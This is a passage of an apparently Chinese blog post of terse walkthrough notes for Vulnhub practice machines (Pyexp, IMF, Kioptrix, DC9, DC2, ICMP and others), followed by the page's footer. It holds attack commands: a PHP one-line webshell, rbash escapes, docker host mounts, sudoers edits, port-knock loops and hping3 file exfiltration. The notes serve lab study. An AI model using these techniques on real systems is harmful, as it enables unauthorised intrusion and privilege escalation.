+<li><code>import pty; pty.spawn(&quot;/bin/bash&quot;)</code></li>
+</ul>
+<p><a href="https://www.infosecarticles.com/pyexp-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.infosecarticles.com/pyexp-vulnhub-walkthrough/</a></p>
+<p><a name="KU5Ad"></a></p>
+<h3 id="Seppuku"><a href="#Seppuku" class="headerlink" title="Seppuku"></a>Seppuku</h3><ul>
+<li>web目录里找到用户名和密码字典，爆破ssh</li>
+<li>ssh  -t ‘bash –noprofile’ 绕过rbash</li>
+<li>sudo -l发现用户A可以以root执行用户B目录下的文件，分别用密码和密钥登录两个用户构造利用</li>
+</ul>
+<p><a name="GM0jZ"></a></p>
+<h3 id="DriftingBlues6"><a href="#DriftingBlues6" class="headerlink" title="DriftingBlues6"></a>DriftingBlues6</h3><ul>
+<li>robots.txt里找到后台路径和.zip后缀提示，扫到压缩包爆破</li>
+<li>textpattern后台文件上传getshell</li>
+<li>内核版本3.2.0-4 脏牛40839提权（是建立firefart用户）</li>
+</ul>
+<p><a name="iaWiC"></a></p>
+<h3 id="TommyBoy"><a href="#TommyBoy" class="headerlink" title="TommyBoy"></a>TommyBoy</h3><ul>
+<li>非常多的信息收集，修改UA，使用Crunch生成自定义格式的密码字典</li>
+</ul>
+<p><a name="YHOGu"></a></p>
+<h3 id="Moria"><a href="#Moria" class="headerlink" title="Moria"></a>Moria</h3><ul>
+<li>web目录下随机返回文本，猜测在读一个txt，扫到txt根据提示抓包看knock</li>
+<li>web自动对几个低端口在做knock，将端口号转ASCII码得到密码，脑洞</li>
+<li>根据文本提示用用户名和密码登FTP，没有下载权限但可以看到一个web目录</li>
+<li>访问看到一组用户名密码，源码里有加密方式和盐，john解密(dynamic_6, refer to: <a href="https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC" target="_blank" rel="noopener">https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC</a>)，尝试登ssh</li>
+<li>存在./ssh/id_rsa，尝试ssh <a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>成功（这个linpeas也只能标红，看不出是哪个用户的key）</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/104163657" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104163657</a></p>
+<p><a name="GN0lB"></a></p>
+<h3 id="IMF"><a href="#IMF" class="headerlink" title="IMF"></a>IMF</h3><ul>
+<li>页面源码提示，拼接路径，根据页面信息的用户名，php弱类型绕过登录，报错注入</li>
+<li>GIF89A图片马文件上传，限制了函数使用，可以&lt;?php $c=$_GET[‘c’]; echo <code>$c</code>; ?&gt;或者weevely</li>
+<li>注意木马后缀和Content-Type，这里实际有一个.htaccess将gif解析到了php，但是浏览器访问403看不到</li>
+<li>AddType application/x-httpd-php .php .gif AddHandler application/x-httpd-php .gif</li>
+</ul>
+<p><a href="https://g0blin.co.uk/imf-vulnhub-writeup/" target="_blank" rel="noopener">https://g0blin.co.uk/imf-vulnhub-writeup/</a><br><a href="https://blog.csdn.net/shenyu_1126/article/details/110188872" target="_blank" rel="noopener">https://blog.csdn.net/shenyu_1126/article/details/110188872</a></p>
+<p><a name="s21WK"></a></p>
+<h3 id="Kioptrix1"><a href="#Kioptrix1" class="headerlink" title="Kioptrix1"></a>Kioptrix1</h3><ul>
+<li>139端口Samba 2.2.1a有9924.rb或者10.c可以直接打到root，但是nmap扫不出这个版本，需要用msf的smb_version或者wireshark抓包或者其他工具扫出这个版本</li>
+<li>或者nmap扫到443端口有mod_ssl 2.8.4这个模块，47080.c打到apache权限后再3.c内核提权（kernel 2.4 RedHat）</li>
+</ul>
+<p><a name="snEcM"></a></p>
+<h3 id="Kioptrix2"><a href="#Kioptrix2" class="headerlink" title="Kioptrix2"></a>Kioptrix2</h3><ul>
+<li>登录框万能密码，ping命令注入弹shell</li>
+<li>kernel 2.6.9提权但是只有9545.c可用，这里要注意searchspolit只能搜2.6，写到小版本就搜不到</li>
+</ul>
+<p><a name="EttVA"></a></p>
+<h3 id="Kioptrix3"><a href="#Kioptrix3" class="headerlink" title="Kioptrix3"></a>Kioptrix3</h3><ul>
+<li>lotuscms RCE，拿web权限找数据库密码（<strong>linpeas没发现，手工翻</strong>）登phpmyadmin</li>
+<li>找到更多口令，登不同ssh账户找信息（<strong>广度优先</strong>），找到一个SUID编辑器，改文件提权</li>
+</ul>
+<p><a href="https://www.cnblogs.com/starrys/p/14660428.html" target="_blank" rel="noopener">https://www.cnblogs.com/starrys/p/14660428.html</a><br><a name="dWswz"></a></p>
+<h3 id="HackinOS"><a href="#HackinOS" class="headerlink" title="HackinOS"></a>HackinOS</h3><ul>
+<li>wordpress但是upload.php文件上传，源码（<strong>记得下拉</strong>）有hint看到检测MIME和webshell随机重命名规则</li>
+<li>弹shell后看到ip172和其他环境说明在docker，wp-config看到mysql凭据，连进去找到信息</li>
+<li>docker里没ssh，从外面再ssh进宿主机，然后docker提权或者SUID文件环境变量提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/valecalida/article/details/121366341" target="_blank" rel="noopener">https://blog.csdn.net/valecalida/article/details/121366341</a></p>
+<p><a name="I0n8f"></a></p>
+<h3 id="Vulnerable-docker"><a href="#Vulnerable-docker" class="headerlink" title="Vulnerable docker"></a>Vulnerable docker</h3><ul>
+<li>wordpress密码爆破后台getshell，地址是172在docker里，在内网扫C段端口<strong>（还缺个好工具）（不知道fscan只做扫描让不让用）</strong></li>
+<li><strong>（把扫描器丢内网扫，而不是把流量代理进去扫，因为很不稳定）</strong></li>
+<li>搭建frp反代出来，访问扫描到的8022端口，发现是web模拟的docker shell，弹shell到kali</li>
+<li>-sT：使用TCP扫描，因为我frp配的是tcp协议</li>
+</ul>
+<p><img src="/img/20230721220114.png" alt></p>
+<ul>
+<li>/.dockerenv存在说明还是一个docker容器，</li>
+<li>/var/run/docker.sock存在说明可以使用docker remote API未授权访问漏洞</li>
+<li>或<code>./docker run -it -v /:/host ubuntu bash</code>挂载宿主机目录 <a href="https://xz.aliyun.com/t/8558#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/8558#toc-4</a></li>
+</ul>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2MDI0NTM2Nw==&amp;mid=2247487509&amp;idx=1&amp;sn=563b65936055600a5dae78bb14430c48" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2MDI0NTM2Nw==&amp;mid=2247487509&amp;idx=1&amp;sn=563b65936055600a5dae78bb14430c48</a><br><a href="https://arz101.medium.com/vulnhub-vulnerable-docker-easy-9b5d0d567531" target="_blank" rel="noopener">https://arz101.medium.com/vulnhub-vulnerable-docker-easy-9b5d0d567531</a></p>
+<p><a name="BXrmV"></a></p>
+<h3 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h3><ul>
+<li>登录框注入得到一批口令，登录后看到File not exist提示，fuzz尝试LFI</li>
+<li>从../../../../../proc/sched_debug看到有knockd<strong>（本来扫端口没看到22就要警觉knock）</strong></li>
+<li>读配置文件/etc/knockd.conf看端口顺序</li>
+<li><code>for x in 7469 8475 9842;do nmap ‐Pn ‐‐max‐retries 0 ‐p $x 192.168.56.112;done</code>  </li>
+<li>或<code>for x in 7469 8475 9842 22 ;do nc 192.168.56.112 $x;done</code>   两种方便的knock方法</li>
+<li>组合前面口令爆破ssh，登上去找信息再组合再爆，新的用户sudo -l有一个文件可以利用</li>
+<li>从上级目录（这里不用反编译）找到源码，是追加写文件的功能，那么可以写/etc/passwd</li>
+<li>或/etc/sudoers        joeyt ALL=(ALL) ALL</li>
+</ul>
+<p><a href="https://zhuanlan.zhihu.com/p/348045207" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/348045207</a></p>
+<p><a name="Azvo5"></a></p>
+<h3 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h3><ul>
+<li>wordpress文章提示cewl，根据爬取网页生成字典（-v 可verbose），爆破用户口令</li>
+<li>两个用户登后台都没有admin权限没法shell，再登SSH</li>
+<li>这里的rbash用ssh bash或者-t ‘bash –noprofile’都没用了，echo $PATH看到有限的可执行命令</li>
+<li><code>BASH_CMDS[a]=/bin/sh;a</code>  /bin/sh赋值给a,执行a</li>
+<li><code>export PATH=$PATH:/bin/:/usr/bin</code>  导入环境变量 </li>
+<li><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></li>
+<li>提示su，切换用户 sudo -l git提权</li>
+</ul>
+<p><a name="r23O6"></a></p>
+<h3 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h3><ul>
+<li>Wordpress文章内容提示plugin，但是wpscan -vp/ap/p都扫不到</li>
+<li>根据靶机提示的密码规则爆Wordpress用户口令，进后台没有额外提示信息，只多个Activity monitor插件</li>
+<li>searchsploit打插件漏洞拿到web权限，wp-config.php里密码没用到，可以读用户目录，找到用户1密码</li>
+<li>sudo -l可以用用户2执行backup.sh文件，又可编辑文件，弹用户2shell，sudo -l (root) nmap提权</li>
+</ul>
+<p><a name="jivwA"></a></p>
+<h3 id="lin-security"><a href="#lin-security" class="headerlink" title="lin.security"></a>lin.security</h3><ul>
+<li>Linux提权专项练习，获取不到IP看<a href="https://segmentfault.com/a/1190000039013575?sort=votes" target="_blank" rel="noopener">https://segmentfault.com/a/1190000039013575?sort=votes</a>，bob/secret登录SSH作为入口点</li>
+<li>sudo -l一堆bin文件可以用，SUID文件可以用，</li>
+<li><strong>/etc/passwd里有哈希要熟练：直接替换或者john –wordlist=rockyou，不要硬爆</strong></li>
+</ul>
+<p><a name="QT3z5"></a></p>
+<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><ul>
+<li>Monitor web系统一眼直接getshell，用户目录下提示crypt.php</li>
+<li>这里走偏了去web里找加密了，当前目录下有个不可读文件夹，就没觉得异常</li>
+<li>应该直接读/crypt.php，文件夹不可读但是里面的文件可读</li>
+<li>找到密码登用户，sudo -l hping3可以利用，大家都写的读root私钥，但其实可以直接读flag</li>
+<li>第一个终端 <code>sudo hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/proof.txt</code></li>
+<li>第二个终端 <code>sudo hping3 --icmp 127.0.0.1 --listen signature --safe</code></li>
+</ul>
+<p><a name="fnQwu"></a></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>Spydersec : 杂项， js解码转ASCII，cookie里目录，视频里隐藏TrueCrypt文件</li>
+<li>Gaara : base58解码，ssh爆破，gdb SUID提权</li>
+<li>BSides-Vancouver : wordpress口令爆破后台getshell计划任务提权</li>
+<li>OSCP：/secret.txt解码获得私钥登SSH，SUID提权或覆盖环境变量或写服务调用文件或lxd提权</li>
+<li>SoSimple: wordpress插件RCE，用户目录.ssh密钥登录</li>
+<li>funbox7: -x .php扩大信息搜集范围，webshell后SSH爆用户口令</li>
+<li>EVM: 开了一堆端口，结果就是WP rockyou爆破getshell隐藏文件含有root密码，网页还是坏的</li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2023-07-14/">
+                    OSCP NOTE (Cheatsheet)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2023-02-13/">
+                    Honeypot-Factory: The Use of Deception in ICS/OT Environments
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sar2html"><span class="toc-number">1.</span> <span class="toc-text">sar2html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LiterallyVulnerable"><span class="toc-number">2.</span> <span class="toc-text">LiterallyVulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misdirection"><span class="toc-number">3.</span> <span class="toc-text">Misdirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prime1"><span class="toc-number">4.</span> <span class="toc-text">prime1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#election"><span class="toc-number">5.</span> <span class="toc-text">election</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile-2"><span class="toc-number">6.</span> <span class="toc-text">Glasgow Smile 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#healthcare"><span class="toc-number">7.</span> <span class="toc-text">healthcare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secarmy-village"><span class="toc-number">8.</span> <span class="toc-text">secarmy_village</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DevGuru1"><span class="toc-number">9.</span> <span class="toc-text">DevGuru1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tiki"><span class="toc-number">10.</span> <span class="toc-text">Tiki</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webdeveloper"><span class="toc-number">11.</span> <span class="toc-text">webdeveloper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solidstate"><span class="toc-number">12.</span> <span class="toc-text">solidstate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tr0ll02"><span class="toc-number">13.</span> <span class="toc-text">Tr0ll02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escalate-Linux"><span class="toc-number">14.</span> <span class="toc-text">Escalate_Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pinky’s-palace-02"><span class="toc-number">15.</span> <span class="toc-text">Pinky’s palace 02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zico2"><span class="toc-number">16.</span> <span class="toc-text">zico2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-number">17.</span> <span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadOfTheRoot"><span class="toc-number">18.</span> <span class="toc-text">LoadOfTheRoot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decoy"><span class="toc-number">19.</span> <span class="toc-text">decoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn3"><span class="toc-number">20.</span> <span class="toc-text">djinn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn1"><span class="toc-number">21.</span> <span class="toc-text">djinn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nullbyte"><span class="toc-number">22.</span> <span class="toc-text">nullbyte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile"><span class="toc-number">23.</span> <span class="toc-text">Glasgow Smile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w34kn3ss"><span class="toc-number">24.</span> <span class="toc-text">w34kn3ss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pyexp"><span class="toc-number">25.</span> <span class="toc-text">Pyexp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seppuku"><span class="toc-number">26.</span> <span class="toc-text">Seppuku</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DriftingBlues6"><span class="toc-number">27.</span> <span class="toc-text">DriftingBlues6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TommyBoy"><span class="toc-number">28.</span> <span class="toc-text">TommyBoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moria"><span class="toc-number">29.</span> <span class="toc-text">Moria</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IMF"><span class="toc-number">30.</span> <span class="toc-text">IMF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix1"><span class="toc-number">31.</span> <span class="toc-text">Kioptrix1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix2"><span class="toc-number">32.</span> <span class="toc-text">Kioptrix2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix3"><span class="toc-number">33.</span> <span class="toc-text">Kioptrix3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HackinOS"><span class="toc-number">34.</span> <span class="toc-text">HackinOS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-docker"><span class="toc-number">35.</span> <span class="toc-text">Vulnerable docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC9"><span class="toc-number">36.</span> <span class="toc-text">DC9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC2"><span class="toc-number">37.</span> <span class="toc-text">DC2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC6"><span class="toc-number">38.</span> <span class="toc-text">DC6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lin-security"><span class="toc-number">39.</span> <span class="toc-text">lin.security</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP"><span class="toc-number">40.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">41.</span> <span class="toc-text">其他</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"50台Vulnhub靶机Walkthrough　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2023-07-14/" title="上一篇: OSCP NOTE (Cheatsheet)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2023-02-13/" title="下一篇: Honeypot-Factory: The Use of Deception in ICS/OT Environments">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023-10-28/">窗口期的OSCP(PEN-200-2023)总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-07-14/">OSCP NOTE (Cheatsheet)</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-04-30/">50台Vulnhub靶机Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-02-13/">Honeypot-Factory: The Use of Deception in ICS/OT Environments</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-08-21/">Pass the Hash再思考：场景、补丁与监测</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-26/">RFID初探之M1卡的分析与复制（使用PN532模块）</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-13/">Websocket渗透测试指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-12-14/">关于log4j、log4shell的一些记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-11-27/">红队视角下的信息收集（备忘 && 持续收集）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-07-30/">Linux Basic for Hackers</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-02-09/">安全相关HTTP响应头解读、配置、示例与检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-10-31/">Cobaltstrike Server持久化 & Cobaltstrike与Metasploit相互派生shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-08-21/">深入了解子域名挖掘tricks</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-05-14/">Android开发实践之计算器&记事助手</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-13/">用Origin请求头防御CSRF攻击(译文)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-07/">PHP中的随机数安全问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-03-20/">WordPress 5.1.1 CSRF to RCE 跟进分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CORS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置踩坑记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」 Hack for Fun</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2024 Fazx
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+            
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "!!!∑(ﾟДﾟノ)ノ快回来!!!  " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
